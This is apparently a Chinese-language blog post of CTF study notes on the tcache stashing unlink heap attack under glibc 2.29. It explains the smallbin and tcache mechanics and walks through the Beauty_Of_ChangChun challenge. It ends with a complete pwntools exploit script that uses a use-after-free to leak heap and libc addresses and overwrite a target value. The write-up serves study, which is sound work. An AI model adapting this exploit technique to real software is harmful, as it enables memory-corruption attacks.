---
layout:     post
title:      学习tcache-stashing-unlik
subtitle:   libc2.29下stash利用学习笔记
date:       2020-11-23
author:     X1ng
header-img: stash-unlink.jpg
catalog: true
tags:

- 学习笔记
- stash
- unlink

---

周末打了祥云杯，就做出了两道很常规的pwn，有一道没见过的利用stash的题，听说smallbin要有两个chunk，把两个chunk搞到smallbin之后就只能看着学长输出了，赛后学习一波

## smallbin

smallbin有不同大小的62个，每个smallbin也是一个由对应free chunk组成的循环双链表，采用FIFO(先入先出)算法（释放操作就将新释放的chunk添加到链表的front end(前端)；分配操作就从链表的rear end(尾端)中获取chunk）



## 漏洞原理

漏洞的成因就是在同时使用tcache和smallbin时，如果向smallbin申请chunk后，smallbin里还有chunk并且对应的tcache未被填满（也不能为空），则会将smallbin中剩余的chunk放入tcache里

但是在对应tcache未被填满的情况下不能往smallbin中放入chunk，在对应tcache未空的情况下不能从smallbin中取出chunk，上面这种情况好像不会发生

其实是如果使用calloc分配内存的话，就不会从tcache中取chunk，这样就可以在对应tcache未空的情况下从smallbin中取出chunk，而如果在calloc之前先从tcache申请chunk，就可以满足上面的情况



将smallbin中的chunk放入tcache部分源码如下

```c
//如果成功获取了smallbin中最后一个chunk，则进入if分支
if (tc_victim != 0)
{
	// 让bck指向smallbin中倒数第二个chunk
	bck = tc_victim->bk;
	set_inuse_bit_at_offset (tc_victim, nb);
	if (av != &main_arena)
	set_non_main_arena (tc_victim);
	//从smallbin取出最后一个chunk的unlink操作
	bin->bk = bck;
	bck->fd = bin;
	//将其放入到tcache中
	tcache_put (tc_victim, tc_idx);
}
```

由于smallbin的FIFO性质，在向smallbin申请chunk的时候会将先进入的chunk分配给用户，也就是说如果能改写后进入smallbin的chunk的bk指针（也就是源码中的bck）为`目标地址-0x10`，在后面的unlink操作中`bac->fd = bin`就会将目标地址（也就是`目标地址-0x10+0x10`）修改为fd，从而实现向目标地址写入一个libc地址的效果



## 例题复现

### [祥云杯2020 Beauty_Of_ChangChun](https://github.com/X1ngn/ctf/blob/master/%E5%A4%AA%E6%B9%96%E6%9D%AF2020%E7%BA%BF%E4%B8%8A.zip)

例行检查

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkyz9czo2aj320q05omyj.jpg)

ida打开

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkyz6aq89dj31230u0aez.jpg)

先看看开始的初始化函数

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkyzals34vj31300u0tjy.jpg)

会将flag读取到mmap分配的随机地址中，然后在前面加一个随机数，还给了这个随机地址

add函数用calloc分配，bss段存chunk的address和size

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkyzmgwcssj31000qcjtl.jpg)

delete函数

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkyzkm9gjpj319e0neq4k.jpg)

free后只用`LOBYTE(dword_202060[v1]) = 0;`清空size的低位，如果chunk大小为0x100可以uaf

有edit函数

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkyzlp66vuj31g40rw782.jpg)

show函数限制了次数

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkyzp7dksij31dc0ncwgd.jpg)

重点函数

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkyzts2ypxj31460u077i.jpg)

在show两次之后可以malloc一次，再调用则将指定idx的chunk中的内容与初始化函数中产生的随机数比较，相同则输出flag

还给了一个calloc申请chunk的函数

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkyzpwfoomj30sy0dyt9l.jpg)

思路就是uaf泄露堆地址和libc，构造smallbin中保存两个chunk，然后malloc申请掉一个tcache的chunk，uaf写smallbin中后进入的chunk的bk为`*buf-0x10`，这样再次调用calloc的时候就会将flag前面的随机数写为一个libc中的地址

贴一下 **@PTT0** 学长的exp：

```python
#!/usr/bin/python

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'

local=1
binary_name='pwn'

if local:
    p=process("./"+binary_name)

else:
    p=remote('112.126.71.170',43652)
    e=ELF("./"+binary_name)


def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass
      
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()

def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b'\x00'))

def cho(num):
    sla("scenery\n",str(num))
def add(size):
    cho(1)
    sla("size:",str(size))
def delete(idx):
    cho(2)
    sla("idx:",str(idx))
def show(idx):
    cho(4)
    sla("idx:",str(idx))
def edit(idx,data):
    cho(3)
    sla("idx:",str(idx))
    sa("chat:",data)
def gift1(idx):
    cho(5)
    sla("idx",str(idx))
def gift2():
    cho(666)

p.recvline()
addr = int(p.recvline()[:-1],16)


for i in range(7):
    add(0xf0)
    delete(0)
add(0xf0)#0

add(0xf0)#1

add(0x80)#2

delete(0)
delete(1)

z('b*$rebase(0x1608)')
add(0x100)#0

add(0xe0)#1

delete(1)
add(0x100)#1

delete(2)
add(0x90)#2


delete(0)
edit(0,'aaaa')
delete(0)
show(0)
p.recvuntil('see\n')
heap_base = leak_address()-0x2a0-0x700

edit(0,'aaaa')
delete(0)
edit(0,'aaaa')
delete(0)
edit(0,'aaaa')
delete(0)
edit(0,'aaaa')
delete(0)
edit(0,'aaaa')
delete(0)
edit(0,'aaaa')

delete(1)
show(1)
p.recvuntil('see\n')
libc_base = leak_address()-0x1ebbe0
print(hex(heap_base),hex(libc_base))
delete(0)
gift2()
cho(5)
sl(p64(heap_base+0xc20)+p64(addr-0x10))

delete(2)
add(0x100)#2
edit(2,p64(libc_base+0x1ebce0))
print(hex(addr))

gift1(2)
ia()
```

还有更高级的利用方法，有空再学习

>参考资料：
>
>[Linux堆内存管理深入分析](https://zhuanlan.zhihu.com/p/24790164)
>
>[Tcache Stashing Unlink Attack利用思路](https://www.anquanke.com/post/id/198173#h3-2)



